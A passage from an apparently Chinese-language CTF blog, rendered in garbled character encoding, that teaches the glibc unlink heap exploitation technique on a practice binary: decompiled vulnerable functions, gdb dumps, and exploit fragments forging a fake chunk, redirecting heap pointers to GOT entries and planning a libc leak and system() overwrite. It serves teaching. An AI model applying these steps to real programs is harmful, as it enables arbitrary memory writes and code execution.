class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">	pchunk ptr = p2<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr = %p\n&quot;</span>, ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&amp;ptr = %p\n&quot;</span>, &amp;ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr-&gt;fd = %p\n&quot;</span>, ptr-&gt;fd);</span><br><span class="line">	pchunk FD = ptr-&gt;fd;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD = %p\n&quot;</span>,FD);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD-&gt;bk = %p\n&quot;</span>,FD-&gt;bk);</span><br><span class="line">	pchunk BK = ptr-&gt;bk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK = %p\n&quot;</span>,BK);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK-&gt;fd = %p\n&quot;</span>,BK-&gt;fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºunlinkåº”ç”¨äºåŒå‘é“¾è¡¨ï¼Œæ‰€ä»¥æˆ‘mallocäº†ä¸‰å—å¤§äºfast binçš„chunkï¼Œç„¶åå…ˆåé‡Šæ”¾ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">0xa0: 0x602180 â€”â–¸ 0x6020c0 â€”â–¸ 0x602000 â€”â–¸ 0x7ffff7dd1c08 (main_arena+232) â—‚â€” 0x602180</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®©ç»“æ„ä½“æŒ‡é’ˆptræŒ‡å‘chunk2çš„å¤´éƒ¨ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶<code>ptr = 0x6020c0</code></p>
<p>é¦–å…ˆæ˜¯<code>ptr-&gt;fd</code>ï¼Œå¾ˆç®€å•ï¼Œä¸€å…±åˆ†æˆä¸¤æ­¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â–º 0x4006e1 &lt;main+187&gt;    mov    rax, qword ptr [rbp - 0x38]</span><br><span class="line">  0x4006e5 &lt;main+191&gt;    mov    rax, qword ptr [rax + 0x10]</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>[rbp - 0x38] == 0x6020c0 == ptr</code>ï¼Œ<code>[rax + 0x10] == *(ptr + 2) == 0x602000</code></p>
<p>ç»¼åˆèµ·æ¥å…¶å®ä¹Ÿå°±ä¸€æ­¥ï¼š<code>*(ptr + 2)</code></p>
<p>é‚£ä¹ˆ<code>FD-&gt;bk</code>å‘¢ï¼Ÿä¸€å…±åˆ†æˆä¸¤æ­¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â–º 0x40071d &lt;main+247&gt;    mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">  0x400721 &lt;main+251&gt;    mov    rax, qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>[rbp - 0x18] == FD == 0x602000</code>ï¼Œ<code>[rax + 0x18] == *(FD + 3) = 0x6020c0</code></p>
<p>ç»¼åˆèµ·æ¥å…¶å®è¿˜æ˜¯ä¸€æ­¥ï¼š<code>*(FD + 3)</code></p>
<p>åˆ°è¿™é‡Œä¸ºæ­¢å…¶å®å°±å¯ä»¥è¯´æ˜<code>FD-&gt;bk</code>è¿™æ¡æŒ‡ä»¤å…¶å®ç­‰æ•ˆäº<code>*(*(ptr + 2) + 3)</code>ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>ptr == 0x6020c0</code>ï¼Œé‚£ä¹ˆ<code>FD-&gt;bk</code>ä¹Ÿå°±ç­‰æ•ˆäº<code>*(*(0x6020c0 + 0x10) + 0x18)</code></p>
<p>åŒæ ·çš„é“ç†ï¼Œ<code>BK-&gt;fd</code>ç­‰æ•ˆäº<code>*(*(ptr + 3) + 2) == *(*(0x6020c0 + 0x18) + 0x10)</code></p>
<h4 id="ç”¨ä¸€é“é¢˜ç›®æ¥è®²"><a href="#ç”¨ä¸€é“é¢˜ç›®æ¥è®²" class="headerlink" title="ç”¨ä¸€é“é¢˜ç›®æ¥è®²"></a>ç”¨ä¸€é“é¢˜ç›®æ¥è®²</h4><p>ï¼ˆæœ¬é¢˜æ˜¯<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11q4y1E7E2?spm_id_from=333.788.top_right_bar_window_history.content.click">ã€æ˜Ÿç›Ÿå®‰å…¨ã€‘PWNç³»åˆ—æ•™ç¨‹ ç¬¬20èŠ‚ Unlink</a> æ•™ç¨‹é‡Œçš„ä¾‹é¢˜ï¼Œåœ¨libc-2.23ç¯å¢ƒï¼‰</p>
<p>é¦–å…ˆæ˜¯åˆ›å»ºå †å—çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a book ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how long: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  result = id;</span><br><span class="line">  <span class="keyword">if</span> ( id &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = id;</span><br><span class="line">    <span class="keyword">if</span> ( id &lt;= <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt; <span class="number">0</span> || *(&amp;chunk + id) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;too large!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = id;</span><br><span class="line">        *(&amp;chunk + v3) = <span class="built_in">malloc</span>(size);	<span class="comment">//åœ¨è¿™é‡Œå°†å †æŒ‡é’ˆæ”¾åˆ°äº†.bssæ®µä¸Š</span></span><br><span class="line">        Size[v3] = size;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜æ²¡å¼€PIEï¼Œæ‰€ä»¥çŸ¥é“chunkçš„ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602300 chunk           dq ?                    ; DATA XREF: init+7Câ†‘o</span><br><span class="line">.bss:0000000000602300                                         ; add+83â†‘r ...</span><br><span class="line">.bss:0000000000602308                 db    ? ;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯ä¸€ä¸ªæœ‰å †æº¢å‡ºçš„editåŠŸèƒ½å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which book to write?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how big?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;chunk + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read_0(*(&amp;chunk + v1), v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹ä¸€ä¸ªæ­£å¸¸çš„freeåŠŸèƒ½å‡½æ•°å°±ä¸è´´äº†ï¼Œæœ¬é¢˜æ²¡æœ‰showåŠŸèƒ½å‡½æ•°ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯é‡ç‚¹ï¼Œä¹Ÿæ˜¯æˆ‘å¡äº†å¥½å‡ å¤©æ‰ç¨å¾®ææ‡‚çš„ä¸€äº›ç‚¹ï¼š</p>
<ol>
<li><p>åœ¨unlinkå®ä¸­ï¼Œä¼ è¿›å»çš„PæŒ‡é’ˆï¼š</p>
<p>â‘  å‘ååˆå¹¶ï¼ˆå‘ä½åœ°å€åˆå¹¶ï¼‰æ—¶ï¼Œä¼ è¿›å»çš„PæŒ‡é’ˆçš„å€¼å®é™…ä¸Šæ˜¯â€œå½“å‰è¦freeæ‰çš„chunkçš„å¤´éƒ¨ - prev sizeâ€ï¼ˆä¹Ÿå°±æ˜¯ä½åœ°å€çš„chunkçš„å¤´éƒ¨ï¼‰ï¼ˆè¿™é‡Œè¿˜æœ‰ä¸€ç‚¹ä¸æ‡‚ï¼Œå¦‚æœä¼ è¿›å»çš„PæŒ‡é’ˆæ˜¯ä½åœ°å€çš„chunkçš„å¤´éƒ¨çš„è¯ï¼Œé‚£ä¹ˆP-&gt;fdè·ŸP-&gt;bkæ˜¯åœ¨è¿™æœŸé—´å†™è¿›ä½åœ°å€chunké‡Œé¢çš„å—ï¼‰ã€‚</p>
<p>â‘¡ å‘å‰åˆå¹¶ï¼ˆå‘é«˜åœ°å€åˆå¹¶ï¼‰æ—¶ï¼Œå› ä¸ºå½“å‰è¦freeæ‰çš„chunkå°±æ˜¯ä½åœ°å€chunkï¼Œæ‰€ä»¥ä¼ è¿›å»çš„PæŒ‡é’ˆå°±æ˜¯å½“å‰chunkçš„å¤´éƒ¨</p>
</li>
<li><p>å‘ååˆå¹¶ï¼šå‘ä½åœ°å€åˆå¹¶æ—¶å°±è¦åˆ¤æ–­ä½åœ°å€çš„chunkæ˜¯å¦ç©ºé—²ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ¤æ–­å½“å‰chunkçš„Pä½æ˜¯å¦ä¸º0ä»¥åŠæ˜¯å¦æœ‰prev sizeï¼Œå¦‚æœåˆ¤æ–­ä¸ºç©ºé—²ï¼Œå°±ç”¨unlinkåˆå¹¶ã€‚</p>
<p>å‘å‰åˆå¹¶ï¼šå› ä¸ºè¦åˆ¤æ–­é«˜åœ°å€chunkæ˜¯å¦ç©ºé—²ï¼Œæ‰€ä»¥è¦å»æŸ¥çœ‹æ›´é«˜åœ°å€çš„chunkï¼ˆä¸‹ä¸‹ä¸ªchunkï¼‰çš„Pä½ä»¥åŠå…¶æ˜¯å¦æœ‰prev sizeï¼Œå¦‚æœåˆ¤æ–­ä¸ºç©ºé—²ï¼Œå°±ç”¨unlinkåˆå¹¶ã€‚æ‰¾åˆ°ä¸‹ä¸‹ä¸ªchunkçš„æ–¹æ³•å°±æ˜¯ â€œå½“å‰chunkçš„å¤´éƒ¨åœ°å€+å½“å‰chunkçš„size+ä¸‹ä¸€ä¸ªchunkçš„sizeâ€ã€‚</p>
</li>
<li><p>ç»•è¿‡<code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>çš„æ–¹æ³•</p>
<p>çŸ¥é“äº†1ã€2ä¸¤ç‚¹ä¹‹åï¼Œæˆ‘ä»¬å›åˆ°ä¾‹é¢˜</p>
<p>é¦–å…ˆç”³è¯·å››å—chunk</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨addåŠŸèƒ½å‡½æ•°ä¸­æˆ‘ä»¬çŸ¥é“ï¼Œä»0x602300è¿™ä¸ªåœ°å€å¼€å§‹ä¼šä¿å­˜å †æŒ‡é’ˆï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000001955010	0x0000000001955050</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹å‰ä¸¤ä¸ªchunkä¸­çš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000000001955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±æ˜¯è§¦å‘unlinkçš„è¿‡ç¨‹ï¼š</p>
<ol>
<li><p>åœ¨chunk0çš„æ•°æ®æ®µä¸­ä¼ªé€ ä¸€ä¸ªchunkï¼Œä»¥åŠç”¨å †æº¢å‡ºä¿®æ”¹chunk1çš„prev sizeå’Œsize</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd = <span class="number">0x00602300</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x00602300</span>-<span class="number">0x10</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">fake_chunk += p64(fd) + p64(bk)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x30</span>) + p64(<span class="number">0x100</span>)	<span class="comment">#å°†chunk1çš„prev sizeæ”¹æˆfake_chunkçš„å¤§å°ï¼Œä»¥åŠsizeçš„ä½ä¸€bitç½®é›¶</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,fake_chunk)</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹å®Œä¹‹åä¸¤ä¸ªchunkä¸­çš„æ•°æ®å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000031	=&gt;ä»è¿™é‡Œå¼€å§‹å±äºfake_chunk</span><br><span class="line">0x1955020:	0x00000000006022e8	0x00000000006022f0</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å°†fake_chunkçš„fdè®¾ç½®æˆäº†<code>&amp;chunk0 - 0x18</code>ï¼Œbkè®¾ç½®æˆäº†<code>&amp;chunk0 - 0x10</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±è®²åŸå› </p>
<p>â‘  é¦–å…ˆæˆ‘ä»¬è¿™é‡Œå‡†å¤‡çš„æ˜¯å‘ååˆå¹¶ï¼Œä¹Ÿå°±æ˜¯å‘ä½åœ°å€åˆå¹¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹äº†chunk1çš„prev sizeä»¥åŠsizeï¼Œæˆ‘ä»¬æœ€åä¼šé€šè¿‡freeæ‰chunk1æ¥è§¦å‘unlinkçš„å‘ååˆå¹¶ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä¸Šä¿®æ”¹å®Œä¹‹åï¼Œunlinkæ—¶ä¼ è¿›å»çš„PæŒ‡é’ˆçš„å€¼æ˜¯å¤šå°‘å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯chunk1çš„å¤´éƒ¨åœ°å€ - prev sizeï¼Œä¹Ÿå°±æ˜¯<code>P = 0x1955040 - 0x30 = 0x1955010</code></p>
<p>â‘¡ é‚£ä¹ˆæˆ‘ä»¬å°±çŸ¥é“<code>FD = P-&gt;fd == *(0x1955010 + 0x10) == 0x6022e8</code>ï¼Œ<code>BK = P-&gt;bk == *(0x1955010 + 0x18) == 0x6022f0</code></p>
<p>é‚£ä¹ˆæ˜¾è€Œæ˜“è§ï¼Œ<code>FD-&gt;bk == *(0x6022e8 + 0x18) == *(0x602300) == 0x1955010 == P</code>ï¼ŒåŒæ—¶<code>BK-&gt;fd == *(0x6022f0 + 0x10) == *(0x602300) == 0x1955010 == P</code></p>
<p>å› ä¸º<code>0x602300</code>ä¸Šé¢å­˜æ”¾çš„å°±æ˜¯<code>P</code>çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¤Ÿé€šè¿‡è¿™æ ·çš„æ„é€ ä»è€Œæ¥ç»•è¿‡unlinkçš„æ£€æµ‹</p>
</li>
<li><p>ç„¶åæˆ‘ä»¬freeæ‰chunk1ï¼Œå†æ¥çœ‹çœ‹ä¸¤ä¸ªå †ä¸­çš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000131</span><br><span class="line">0x1955020:	0x00007faf0229bb78	0x00007faf0229bb78</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°chunk1è·Ÿfake_chunkåˆå¹¶äº†ï¼Œå¹¶ä¸”æ”¾åˆ°äº†unsorted binä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x1955010 â€”â–¸ 0x7faf0229bb78 (main_arena+88) â—‚â€” 0x1955010</span><br></pre></td></tr></table></figure></li>
</ol>
<p>é‚£ä¹ˆåˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬å®ç°äº†ä»€ä¹ˆæ•ˆæœå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨unlinkæºç ä¸­çš„è¿™ä¸€éƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>æœ€åunlinkä¼šå°†<code>FD(0x6022e8)</code>å†™è¿›<code>BK-&gt;fd(0x602300)</code>ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x00000000006022e8	0x0000000000000000</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬æ‰€å®ç°çš„å°±æ˜¯å°†<code>&amp;P-0x18</code>å†™è¿›äº†<code>&amp;P</code>é‡Œé¢ï¼Œå®Œæˆäº†å †æŒ‡é’ˆçš„ä¿®æ”¹</p>
<p>ç„¶åæˆ‘ä»¬å†ç”¨editåŠŸèƒ½å‡½æ•°ç¼–è¾‘chunk0çš„æ—¶å€™ï¼Œå®é™…ä¸Šå°±æ˜¯ä»<code>0x6022e8</code>å¼€å§‹å†™å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½è¿›ä¸€æ­¥å°†å †æŒ‡é’ˆä¿®æ”¹æˆä»»æ„å€¼ï¼Œä»è€Œå®Œæˆæœ€åçš„ä»»æ„åœ°å€å†™</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è¿™é¢˜å‰©ä¸‹çš„éƒ¨åˆ†äº†ï¼Œæˆ‘ä»¬å°†å †æŒ‡é’ˆä¿®æ”¹æˆå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000000602060	0x0000000000602060</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000000602018	0x0000000001955260</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæœ¬é¢˜çš„gotè¡¨å¯æ”¹ï¼Œè€Œä¸”æ²¡æœ‰showåŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†freeå‡½æ•°çš„gotè¡¨æ”¹æˆputså‡½æ•°ï¼Œç„¶åfree(0)å°±èƒ½å°†atoiå‡½æ•°çš„gotè¡¨æ³„æ¼ï¼Œå®Œæˆlibcçš„æ³„æ¼ï¼Œæœ€åfreeæ”¹systemå°±è¡Œã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/extend-overlopping/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/07/extend-overlopping/" class="post-title-link" itemprop="url">extend_overlopping</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-07 01:17:02" itemprop="dateCreated datePublished" datetime="2022-05-07T01:17:02+08:00">2022-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-10 01:50:13" itemprop="dateModified" datetime="2022-05-10T01:50:13+08:00">2022-05-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ol>
<li><p>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</p>
</li>
<li><p>è¯¥æ¼æ´å¯ä»¥æ§åˆ¶ chunk hearder ä¸­çš„æ•°æ®</p>
</li>
</ol>
<h3 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h3><p>ä½¿å¾—å—é‡å ä¹‹åèƒ½åˆ©ç”¨å¤§chunkä¿®æ”¹å…¶åŒ…å«çš„å°chunkçš„å†…å®¹</p>
<p>å¦‚æœæŸä¸ªchunkä¸­å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œå‡½æ•°æŒ‡é’ˆç­‰ç­‰ï¼Œå°±å¯ä»¥è€ƒè™‘è¿™ç§åˆ©ç”¨æ–¹å¼</p>
